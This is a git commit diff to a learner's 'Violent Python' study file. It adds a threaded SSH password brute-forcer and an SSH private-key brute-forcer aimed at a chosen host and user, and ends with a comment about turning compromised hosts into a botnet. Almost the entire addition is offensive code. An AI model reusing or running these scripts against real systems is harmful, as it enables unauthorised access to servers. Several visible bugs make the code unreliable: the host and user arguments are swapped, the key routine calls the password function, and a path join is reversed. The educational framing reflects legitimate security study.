e6ffa27a67c00736f2485506eca644874ac11d91
Azazel5 <subhanga2013@gmail.com>
2021-06-17 21:43:28 -0400

    ssh breaking and botnets

--- violent-python/violent.py
+++ violent-python/violent.py
@@ -1,12 +1,16 @@
 #####################################################################
 # Chapter 1
 #####################################################################
+
+import os
 import nmap
+import time
 import crypt
+import pexpect
 import zipfile
 import optparse
 from socket import *
-from threading import Thread, Semaphore
+from threading import *
 
 
 def banner_and_service_example():
@@ -169,8 +173,8 @@ def main_zip():
 
 
 def handshake():
-    parser = optparse.OptionParser('usage %prog –H' +
-                                   '<target host> -p <target port>')
+    parser = optparse.OptionParser(
+        'usage %prog –H' + '<target host> -p <target port>')
 
     parser.add_option('-H', dest='tgtHost', type='string',
                       help='specify target host')
@@ -240,16 +244,179 @@ def port_scan(host, ports):
 # something to the terminal - disaster!!
 # Use semaphores to rescue you from this situation.
 
-# Although the above example was fun to work though, it is limited in the sense that 
+# Although the above example was fun to work though, it is limited in the sense that
 # it only uses handshake scanning, while you may very well want to use others as well.
 # Enter, nmap-python.
+
 
 def nmap_scan(host, port):
     nm = nmap.PortScanner()
     nm.scan(host, port)
     state = nm[host]['tcp'][int(port)]['state']
-    return state 
+    return state
 
-# Let's try to create our own SSH worm. We will use the Pexpect moduel, which can be 
-# used to monitor and interact with programs, making it a good choice to work with 
+# Let's try to create our own SSH worm. We will use the Pexpect moduel, which can be
+# used to monitor and interact with programs, making it a good choice to work with
 # SSH consoles.
+
+
+PROMPT = ['#', '>>>', '>', '\$']
+max_connections = 5
+connection_lock = BoundedSemaphore(value=max_connections)
+found = False
+fails = 0
+
+
+def send_command(child, cmd):
+    child.sendline(cmd)
+    child.expect(PROMPT)
+    print(child.before)
+
+
+def connect(user, host, password, release):
+    # If you wanna use a global variable in a functional scope instead of creating a local
+    # copy of the same, use the global keyword. Pylance linting will also show you if
+    # you're not using any particular variable nicely (if you're only updating the variable
+    # in the function).
+
+    global found
+    global fails
+
+    try:
+        s = pexpect.pxssh()
+        s.login(host, user, password)
+        print("Password found!")
+        found = True
+
+    # How to handle multiple exceptions!
+    except Exception as e:
+        if 'read_nonblocking' in str(e):
+            fails += 1
+            time.sleep(5)
+
+            # Recursively call again after sleeping for 5 seconds
+            connect(user, host, password, False)
+
+        elif 'synchronize with original prompt' in str(e):
+            time.sleep(1)
+            connect(user, host, password, False)
+
+        else:
+            print(str(e))
+
+    finally:
+        if release:
+            connection_lock.release()
+
+
+# Python pro tip: if you wanna break up function calls
+# or long print statements up, use one of '\' these
+# bad boys and move along.
+def ssh_main():
+    parser = optparse.OptionParser('usage%prog ' +
+                                   '-H <target host> -u <user> -F <password list>')
+
+    parser.add_option('-H', dest='tgtHost', type='string', help='target host')
+    parser.add_option('-u', dest='tgtUser', type='string', help='target user')
+    parser.add_option('-F', dest='passwordFile',
+                      type='string', help='password file')
+
+    options, _ = parser.parse_args()
+    tgtHost, tgtUser, passwordFile = options.tgtHost, options.tgtUser, options.passwordFile
+
+    if tgtHost == None or tgtUser == None or passwordFile == None:
+        print(parser.usage)
+        return
+
+    with open(passwordFile, 'r') as pass_file:
+        for line in pass_file.readlines():
+            if found:
+                return
+            if fails > 5:
+                print("Too many timeouts!")
+                return
+
+            connection_lock.acquire()
+            password = line.strip("\n").strip("\r")
+            print("Testing password " + password)
+            t = Thread(target=connect, args=(tgtHost, tgtUser,
+                                             password, True))
+            _ = t.start()
+
+
+# SSH can also be done with public key cryptography, which is more complex than the
+# simple UNIX passwords seen earlier. Let's try to create a SSH key breaker.
+
+stop = False
+
+
+def connect_key(user, host, keyfile, release):
+    global fails
+    global stop
+
+    try:
+        perm_denied = "permission denied"
+        ssh_newkey = 'Are you sure you want to continue'
+        conn_closed = 'Connection closed by remote host'
+        opt = '-o PasswordAuthentication=no'
+        connection_string = f"ssh {user}@{host} –i {keyfile} {opt}"
+        child = pexpect.spawn(connection_string)
+
+        ret = child.expect([pexpect.TIMEOUT, perm_denied,
+                            ssh_newkey, conn_closed, '$', '#', ])
+
+        if ret == 2:
+            print('[-] Adding Host to ∼/.ssh/known_hosts')
+            child.sendline('yes')
+            connect(user, host, keyfile, False)
+
+        elif ret == 3:
+            print('[-] Connection Closed By Remote Host')
+            fails += 1
+
+        elif ret > 3:
+            print("[+] Success " + str(keyfile))
+            stop = True
+
+    finally:
+        if release:
+            connection_lock.release()
+
+
+def key_main():
+    parser = optparse.OptionParser('usage%prog -H ' +
+                                   '<target host> -u <user> -d <directory>')
+    parser.add_option('-H', dest='tgtHost', type='string',
+                      help='specify target host')
+    parser.add_option('-d', dest='passDir', type='string',
+                      help='specify directory with keys')
+    parser.add_option('-u', dest='user', type='string',
+                      help='specify the user')
+    options, _ = parser.parse_args()
+    host = options.tgtHost
+    passDir = options.passDir
+    user = options.user
+
+    if host == None or passDir == None or user == None:
+        print(parser.usage)
+        return
+
+    for filename in os.listdir(passDir):
+        if stop:
+            print("Key found!")
+            return
+
+        if fails > 5:
+            print("Too many closed connections!")
+            return
+
+        connection_lock.acquire()
+        fullpath = os.path.join(filename, passDir)
+        print("Testing keyfile: " + str(fullpath))
+        t = Thread(target=connect_key, args=(user, host, fullpath, True))
+        _ = t.start()
+
+
+# This is one remote host (or a computer) we just broke into. Malicious attackers
+# often use pools of such broken computers, also called a botnet for, well,
+# malicious purposes. 
